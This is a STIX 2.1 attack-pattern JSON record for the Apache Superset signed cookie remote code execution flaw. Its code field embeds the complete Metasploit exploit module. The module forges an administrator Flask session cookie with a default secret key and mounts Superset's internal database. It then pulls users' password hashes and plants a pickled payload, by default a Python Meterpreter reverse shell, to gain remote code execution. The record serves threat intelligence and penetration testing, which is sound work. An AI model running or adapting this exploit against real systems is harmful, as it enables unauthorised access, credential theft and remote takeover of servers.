{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eed6a52f-eecd-434d-88da-52e0fa3ea988",
    "created": "2024-08-14T17:00:46.530978Z",
    "modified": "2024-08-14T17:00:46.530983Z",
    "name": "Apache Superset Signed Cookie RCE",
    "description": " Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies. These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user. From there the Superset database is mounted, and credentials are pulled. A dashboard is then created. Lastly a pickled python payload can be set for that dashboard within Superset's database which will trigger the RCE.  An attempt to clean up ALL of the dashboard key values and reset them to their previous values happens during the cleanup phase.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_superset_cookie_sig_rce.rb",
            "external_id": "apache_superset_cookie_sig_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Paradoxis/Flask-Unsign"
        },
        {
            "source_name": "reference",
            "url": "https://vulcan.io/blog/cve-2023-27524-in-apache-superset-what-you-need-to-know/"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/apache-superset-part-ii-rce-credential-harvesting-and-more/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-39265#mountsupersetsinternaldatabase"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Superset Signed Cookie RCE',\n        'Description' => %q{\n          Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies.\n          These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that\n          of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user. From there the\n          Superset database is mounted, and credentials are pulled. A dashboard is then created. Lastly a pickled python payload can be\n          set for that dashboard within Superset's database which will trigger the RCE.\n\n          An attempt to clean up ALL of the dashboard key values and reset them to their previous values happens during the cleanup phase.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # MSF module\n          'paradoxis', #  original flask-unsign tool\n          'Spencer McIntyre', # MSF flask-unsign library\n          'Naveen Sunkavally' # horizon3.ai writeup and cve discovery\n        ],\n        'References' => [\n          ['URL', 'https://github.com/Paradoxis/Flask-Unsign'],\n          ['URL', 'https://vulcan.io/blog/cve-2023-27524-in-apache-superset-what-you-need-to-know/'],\n          ['URL', 'https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/'],\n          ['URL', 'https://www.horizon3.ai/apache-superset-part-ii-rce-credential-harvesting-and-more/'],\n          ['URL', 'https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py'],\n          ['EDB', '51447'],\n          ['CVE', '2023-27524'], # flask cookie\n          ['CVE', '2023-37941'], # rce\n          ['CVE', '2023-39265'] # mount superset's internal database\n        ],\n        'Platform' => ['python'],\n        'Privileged' => false,\n        'Arch' => ARCH_PYTHON,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'python/meterpreter/reverse_tcp'\n        },\n        'DisclosureDate' => '2023-09-06',\n\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES],\n          'RelatedModules' => ['auxiliary/gather/apache_superset_cookie_sig_priv_esc']\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8088),\n        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),\n        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),\n        OptInt.new('ADMIN_ID', [true, 'The ID of an admin account', 1]),\n        OptString.new('TARGETURI', [ true, 'Relative URI of Apache Superset installation', '/']),\n        OptPath.new('SECRET_KEYS_FILE', [\n          false, 'File containing secret keys to try, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'superset_secret_keys.txt')\n        ]),\n        OptString.new('DATABASE', [true, 'The superset database location', '/app/superset_home/superset.db'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi!({\n      'uri' => normalize_uri(target_uri.path, 'login/')\n    })\n    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return Exploit::CheckCode::Unknown(\"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n    return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, version_string not detected\") unless res.body.include? 'version_string'\n    unless res.body =~ /&#34;version_string&#34;: &#34;([\\d.]+)&#34;/\n      return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, unable to determine version_string\")\n    end\n\n    version = Rex::Version.new(Regexp.last_match(1))\n    if version < Rex::Version.new('2.0.1') && version >= Rex::Version.new('1.4.1')\n      Exploit::CheckCode::Appears(\"Apache Supset #{version} is vulnerable\")\n    else\n      Exploit::CheckCode::Safe(\"Apache Supset #{version} is NOT vulnerable\")\n    end\n  end\n\n  def get_secret_key(cookie)\n    File.open(datastore['SECRET_KEYS_FILE'], 'rb').each do |secret|\n      secret = secret.strip\n      vprint_status(\"#{peer} - Checking secret key: #{secret}\")\n\n      unescaped_secret = Rex::Text.dehex(secret.gsub('\\\\', '\\\\').gsub('\\\\n', \"\\n\").gsub('\\\\t', \"\\t\"))\n      unless Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, unescaped_secret)\n        vprint_bad(\"#{peer} - Incorrect secret key: #{secret}\")\n        next\n      end\n\n      print_good(\"#{peer} - Found secret key: #{secret}\")\n      return secret\n    end\n    nil\n  end\n\n  def validate_cookie(decoded_cookie, secret_key)\n    print_status(\"#{peer} - Attempting to resign with key: #{secret_key}\")\n    encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(decoded_cookie, secret_key)\n\n    print_status(\"#{peer} - New signed cookie: #{encoded_cookie}\")\n    cookie_jar.clear\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'me', '/'),\n      'cookie' => \"session=#{encoded_cookie};\",\n      'keep_cookies' => true\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    if res.code == 401\n      print_bad(\"#{peer} - Cookie not accepted\")\n      return nil\n    end\n    data = res.get_json_document\n    print_good(\"#{peer} - Cookie validated to user: #{data['result']['username']}\")\n    return encoded_cookie\n  end\n\n  def get_csrf_token\n    vprint_status('Grabbing CSRF token')\n    res = send_request_cgi!({\n      'uri' => normalize_uri(target_uri.path, 'login/'),\n      'keep_cookies' => true\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    fail_with(Failure::NotFound, 'Unable to determine csrf token') unless res.body =~ /name=\"csrf_token\" type=\"hidden\" value=\"([\\w.-]+)\">/\n\n    @csrf_token = Regexp.last_match(1)\n    vprint_status(\"#{peer} - CSRF Token: #{@csrf_token}\")\n  end\n\n  def login_and_priv_esc\n    get_csrf_token\n\n    print_status(\"#{peer} - Attempting login\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'login/'),\n      'keep_cookies' => true,\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'csrf_token' => @csrf_token\n      }\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::NoAccess, \"#{peer} - Failed login\") if res.body.include? 'Sign In'\n\n    cookie = res.get_cookies.to_s\n    print_good(\"#{peer} - Logged in Cookie: #{cookie}\")\n\n    # get the cookie value and strip off anything else\n    cookie = cookie.split('=')[1].gsub(';', '')\n\n    secret_key = get_secret_key(cookie)\n    fail_with(Failure::NotFound, 'Unable to find secret key') if secret_key.nil?\n\n    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie)\n    decoded_cookie['user_id'] = datastore['ADMIN_ID']\n    print_status(\"#{peer} - Modified cookie: #{decoded_cookie}\")\n    @admin_cookie = validate_cookie(decoded_cookie, secret_key)\n    fail_with(Failure::NoAccess, \"#{peer} - Unable to sign cookie with a valid secret\") if @admin_cookie.nil?\n  end\n\n  def set_query_latest_query_id\n    vprint_status('Setting latest query id')\n    @client_id = Rex::Text.rand_text_alphanumeric(8, 12)\n    data = Rex::MIME::Message.new\n    data.add_part('\"' + @client_id + '\"', nil, nil, 'form-data; name=\"latest_query_id\"')\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'tabstateview', @tab_id),\n      'keep_cookies' => true,\n      'cookie' => \"session=#{@admin_cookie};\",\n      'method' => 'PUT',\n      'data' => data.to_s,\n      'headers' => {\n        'Accept' => 'application/json',\n        'X-CSRFToken' => @csrf_token\n      }\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n  end\n\n  def transform_hash(hash)\n    # Some background on transforming this hash:\n    # If we use python hashlib to generate the hash, it matches\n    # example output for password 'admin': $pbkdf2-sha256$260000$CXsb59tSLZm9ABBN$b3ebe68c694857464a5754a9ddd4ddadc9ff8bd093ab13d9d2496f7b81eb79e5\n    # hashlib: >>> pbkdf2_hmac('sha256', b'admin', b'CXsb59tSLZm9ABBN', our_app_iters).hex()\n    #                                                                            'b3ebe68c694857464a5754a9ddd4ddadc9ff8bd093ab13d9d2496f7b81eb79e5'\n    # however, JTR doesn't like this: No password hashes loaded (see FAQ)\n    # hashid also doesn't: [+] Unknown hash\n\n    # the basis of this is the hex() makes it 64 characters, and we need 43 characters to be a real hash\n    # https://hashcat.net/forum/thread-7715.html is the same issue\n    # the solution is to take the value, unhex it, base64 it, remove =, and sub '+' for '.'. This is the same for the salt, except for unhex.\n\n    # example output:     $pbkdf2-sha256$260000$CXsb59tSLZm9ABBN$b3ebe68c694857464a5754a9ddd4ddadc9ff8bd093ab13d9d2496f7b81eb79e5\n    # needs transform to: $pbkdf2-sha256$260000$Q1hzYjU5dFNMWm05QUJCTg$s.vmjGlIV0ZKV1Sp3dTdrcn/i9CTqxPZ0klve4HreeU\n\n    # to get there:                             salt: base64, remove =, sub '+' for '.'\n    # python code:                                    base64.b64encode(b'CXsb59tSLZm9ABBN').decode('utf8').replace('=','').replace('+','.')\n    # python output:                                  Q1hzYjU5dFNMWm05QUJCTg\n\n    # to get there:                                                    hash: unhex, base64, remove =, sub '+' for '.'\n    # python code:                                                     base64.b64encode(binascii.unhexlify(b'b3ebe68c694857464a5754a9ddd4ddadc9ff8bd093ab13d9d2496f7b81eb79e5')).decode('utf8').replace('=','').replace('+','.')\n    # python output:                                                   s.vmjGlIV0ZKV1Sp3dTdrcn/i9CTqxPZ0klve4HreeU\n    header = hash.split('$')[0] # contains algorithm, iterations\n    header = header.sub('pbkdf2:sha256:', '$pbkdf2-sha256$')\n    salt = hash.split('$')[1]\n    salt = Base64.strict_encode64(salt).delete('=').tr('+', '.')\n    hash = hash.split('$')[2]\n    hash = Base64.strict_encode64([hash].pack('H*')).delete('=').tr('+', '.')\n    jtr_password = [header, salt, hash].join('$')\n    jtr_password\n  end\n\n  def mount_internal_database\n    # use cve-2023-39265 bypass to mount superset's internal sqlite db\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'database/'),\n      'method' => 'POST',\n      'cookie' => \"session=#{@admin_cookie};\",\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      'headers' => {\n        'Accept' => 'application/json',\n        'X-CSRFToken' => @csrf_token\n      },\n      'data' => {\n        'engine' => 'sqlite',\n        'configuration_method' => 'sqlalchemy_form',\n        'catalog' => [{ 'name' => '', 'value' => '' }],\n        'sqlalchemy_uri' => \"sqlite+pysqlite:///#{datastore['DATABASE']}\",\n        'expose_in_sqllab' => true,\n        'database_name' => Rex::Text.rand_text_alphanumeric(6, 12),\n        'allow_ctas' => true,\n        'allow_cvas' => true,\n        'allow_dml' => true,\n        'allow_multi_schema_metadata_fetch' => true,\n        'extra_json' => {\n          'cost_estimate_enabled' => true,\n          'allows_virtual_table_explore' => true\n        },\n        'extra' => {\n          'cost_estimate_enabled' => true,\n          'allows_virtual_table_explore' => true,\n          'metadata_params' => {},\n          'engine_params' => {},\n          'schemas_allowed_for_file_upload' => []\n        }.to_json\n      }.to_json\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to mount the internal database: #{datastore['DATABASE']}\") if res.code == 422\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 201\n\n    j = res.get_json_document\n    @db_id = j['id']\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to find 'id' field in response data: #{j}\") if @db_id.nil?\n    print_good(\"Successfully created db mapping with id: #{@db_id}\")\n\n    # create new query tab\n    vprint_status('Creating new sqllab tab')\n    data = Rex::MIME::Message.new\n    data.add_part('{\"title\":\"' + Rex::Text.rand_text_alphanumeric(6, 12) + '\",\"dbId\":' + @db_id.to_s + ',\"schema\":null,\"autorun\":false,\"sql\":\"SELECT ...\",\"queryLimit\":1000}', nil, nil, 'form-data; name=\"queryEditor\"')\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'tabstateview/'),\n      'method' => 'POST',\n      'cookie' => \"session=#{@admin_cookie};\",\n      'keep_cookies' => true,\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'headers' => {\n        'Accept' => 'application/json',\n        'X-CSRFToken' => @csrf_token\n      },\n      'data' => data.to_s\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    j = res.get_json_document\n    @tab_id = j['id']\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to find 'id' field in response data: #{j}\") if @tab_id.nil?\n    print_good(\"Using tab: #{@tab_id}\")\n\n    # tell it we're about to submit a new query\n    set_query_latest_query_id\n\n    # harvest creds\n    vprint_status('Harvesting superset user creds')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'superset', 'sql_json/'),\n      'method' => 'POST',\n      'cookie' => \"session=#{@admin_cookie};\",\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      'headers' => {\n        'Accept' => 'application/json',\n        'X-CSRFToken' => @csrf_token\n      },\n      'data' => {\n        'client_id' => @client_id,\n        'database_id' => @db_id,\n        'json' => true,\n        'runAsync' => false,\n        'schema' => 'main',\n        'sql' => 'SELECT username,password from ab_user;',\n        'sql_editor_id' => '1',\n        'tab' => 'Untitled Query 1',\n        'tmp_table_name' => '',\n        'select_as_cta' => false,\n        'ctas_method' => 'TABLE',\n        'queryLimit' => 1000,\n        'expand_data' => true\n      }.to_json\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    creds_table = Rex::Text::Table.new(\n      'Header' => 'Superset Creds',\n      'Indent' => 2,\n      'Columns' =>\n      [\n        'Username',\n        'Password'\n      ]\n    )\n\n    j = res.get_json_document\n    j['data'].each do |cred|\n      jtr_password = transform_hash(cred['password'])\n      creds_table << [cred['username'], jtr_password]\n\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: cred['username'],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(jtr_password),\n        private_data: jtr_password,\n        service_name: 'Apache Superset',\n        address: datastore['RHOST'],\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n    end\n\n    print_good(creds_table.to_s)\n  end\n\n  def rce_implant\n    # create new dashboard\n    vprint_status('Creating new dashboard')\n    res = send_request_cgi(\n      'keep_cookies' => true,\n      'cookie' => \"session=#{@admin_cookie};\",\n      'uri' => normalize_uri(target_uri.path, 'dashboard', 'new/')\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 302\n\n    res.headers['location'] =~ %r{dashboard/(\\d+)/}\n    @dashboard_id = Regexp.last_match(1)\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to detect dashboard ID from location header: #{res.headers['location']}\") if @dashboard_id.nil?\n    print_good(\"New Dashboard id: #{@dashboard_id}\")\n\n    # get permalink so we can trigger it later for payload execution\n    vprint_status('Grabbing permalink to new dashboard to trigger payload later')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'dashboard', @dashboard_id, 'permalink'),\n      'method' => 'POST',\n      'cookie' => \"session=#{@admin_cookie};\",\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      'headers' => {\n        'Accept' => 'application/json',\n        'X-CSRFToken' => @csrf_token\n      },\n      'data' => {\n        filterState: {},\n        urlParams: []\n      }.to_json\n    )\n    permalink_key = res.get_json_document['key']\n    print_good(\"Dashboard permalink key: #{permalink_key}\")\n\n    # grab the default values so we can unset them later\n    vprint_status('Grabbing values to reset later')\n    set_query_latest_query_id\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'superset', 'sql_json/'),\n      'method' => 'POST',\n      'cookie' => \"session=#{@admin_cookie};\",\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      'headers' => {\n        'Accept' => 'application/json',\n        'X-CSRFToken' => @csrf_token\n      },\n      'data' => {\n        'client_id' => @client_id,\n        'database_id' => @db_id,\n        'json' => true,\n        'runAsync' => false,\n        'schema' => 'main',\n        'sql' => \"SELECT id,value from key_value where resource='dashboard_permalink';\",\n        'sql_editor_id' => '1',\n        'tab' => 'Untitled Query 1',\n        'tmp_table_name' => '',\n        'select_as_cta' => false,\n        'ctas_method' => 'TABLE',\n        'queryLimit' => 1000,\n        'expand_data' => true\n      }.to_json\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    # in the GUI we would get [bytes] (even in the JSON response) so this isn't very convenient. We can use the CSV\n    # output to grab the correct values.\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'superset', 'csv', @client_id),\n      'cookie' => \"session=#{@admin_cookie};\",\n      'keep_cookies' => true\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    @values_to_reset = CSV.parse(res.body)\n\n    # tell it we're about to submit a new query\n    set_query_latest_query_id\n\n    pickled = Rex::Text.to_hex(Msf::Util::PythonDeserialization.payload(:py3_exec, payload.encoded))\n    pickled = pickled.gsub('\\x', '') # we only need a beginning \\x not every character for this format\n\n    vprint_status('Uploading payload')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'superset', 'sql_json/'),\n      'method' => 'POST',\n      'cookie' => \"session=#{@admin_cookie};\",\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      'headers' => {\n        'Accept' => 'application/json',\n        'X-CSRFToken' => @csrf_token\n      },\n      'data' => {\n        'client_id' => @client_id,\n        'database_id' => @db_id,\n        'json' => true,\n        'runAsync' => false,\n        'schema' => 'main',\n        'sql' => \"UPDATE key_value set value=X'#{pickled}' where resource='dashboard_permalink';\", # the dashboard ID doesn't necessarily correspond to the ID in this table, so we just have to overwrite them all\n        'sql_editor_id' => '1',\n        'tab' => 'Untitled Query 1',\n        'tmp_table_name' => '',\n        'select_as_cta' => false,\n        'ctas_method' => 'TABLE',\n        'queryLimit' => 1000,\n        'expand_data' => true\n      }.to_json\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    print_status('Triggering payload')\n    res = send_request_cgi(\n      'keep_cookies' => true,\n      'cookie' => \"session=#{@admin_cookie};\",\n      'uri' => normalize_uri(target_uri.path, 'superset', 'dashboard', 'p', permalink_key, '/')\n    )\n    # we go through some permalink hell here\n    until res.nil? || res.headers['Location'].nil?\n      res = send_request_cgi(\n        'keep_cookies' => true,\n        'cookie' => \"session=#{@admin_cookie};\",\n        'uri' => res.headers['Location']\n      )\n    end\n\n    # 404 error and we win.\n    # log item: 172.17.0.1 - - [14/Sep/2023:17:37:25 +0000] \"GET /superset/dashboard/p/MzABePa5XYd/ HTTP/1.1\" 404 38 \"-\" \"Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1\"\n  end\n\n  def exploit\n    @db_id = nil\n    @csrf_token = nil\n    @tab_id = nil\n    @dashboard_id = nil\n    vprint_status('Attempting login')\n    login_and_priv_esc\n    vprint_status('Attempting to pull user creds from db')\n    mount_internal_database\n    vprint_status('Attempting RCE')\n    rce_implant\n  end\n\n  def cleanup\n    super\n\n    # We didn't know the previous values, so just blank out XXX\n    unless (@client_id.nil? || @csrf_token.nil? || @db_id.nil? || @values_to_reset.nil?)\n      print_status('Unsetting RCE Payloads')\n      @values_to_reset.each do |row|\n        next if row[0] == 'id' # headers\n\n        vprint_status(\"Restoring row ID #{row[0]}\")\n\n        set_query_latest_query_id\n        is_binary = false\n        if (row[1].starts_with?(\"b'\") && row[1].ends_with?(\"'\"))\n          row[1] = row[1][2..-2] # remove encoding and substring marks\n          row[1] = Rex::Text.to_hex(row[1])\n          row[1] = row[1].gsub('\\x', '') # we only need a beginning \\x not every character for this format\n          is_binary = true\n        end\n\n        res = send_request_cgi(\n          'uri' => normalize_uri(target_uri.path, 'superset', 'sql_json/'),\n          'method' => 'POST',\n          'cookie' => \"session=#{@admin_cookie};\",\n          'keep_cookies' => true,\n          'ctype' => 'application/json',\n          'headers' => {\n            'Accept' => 'application/json',\n            'X-CSRFToken' => @csrf_token\n          },\n          'data' => {\n            'client_id' => @client_id,\n            'database_id' => @db_id,\n            'json' => true,\n            'runAsync' => false,\n            'schema' => 'main',\n            'sql' => \"UPDATE key_value set value=#{is_binary ? 'X' : ''}'#{row[1]}' where id='#{row[0]}';\",\n            'sql_editor_id' => '1',\n            'tab' => 'Untitled Query 1',\n            'tmp_table_name' => '',\n            'select_as_cta' => false,\n            'ctas_method' => 'TABLE',\n            'queryLimit' => 1000,\n            'expand_data' => true\n          }.to_json\n        )\n        if res && res.code == 200\n          vprint_good('Successfully restored')\n        else\n          vprint_bad(\"Unable to reset value: #{row[1]}\")\n        end\n      end\n    end\n\n    # delete dashboard\n    unless @dashboard_id.nil?\n      print_status('Deleting dashboard')\n      send_request_cgi(\n        'keep_cookies' => true,\n        'cookie' => \"session=#{@admin_cookie};\",\n        'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'dashboard', @dashboard_id),\n        'method' => 'DELETE',\n        'headers' => {\n          'Accept' => 'application/json',\n          'X-CSRFToken' => @csrf_token\n        }\n      )\n    end\n\n    # delete sqllab tab\n    unless @tab_id.nil?\n      print_status('Deleting sqllab tab')\n      send_request_cgi(\n        'keep_cookies' => true,\n        'cookie' => \"session=#{@admin_cookie};\",\n        'uri' => normalize_uri(target_uri.path, 'tabstateview', @tab_id),\n        'method' => 'DELETE',\n        'headers' => {\n          'Accept' => 'application/json',\n          'X-CSRFToken' => @csrf_token\n        }\n      )\n    end\n\n    # delete mapping to stock database\n    unless @db_id.nil?\n      print_status('Deleting database mapping')\n      send_request_cgi(\n        'keep_cookies' => true,\n        'cookie' => \"session=#{@admin_cookie};\",\n        'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'database', @db_id),\n        'method' => 'DELETE',\n        'headers' => {\n          'Accept' => 'application/json',\n          'X-CSRFToken' => @csrf_token\n        }\n      )\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-09-06",
    "x_mitre_platforms": [
        "['python']"
    ]
}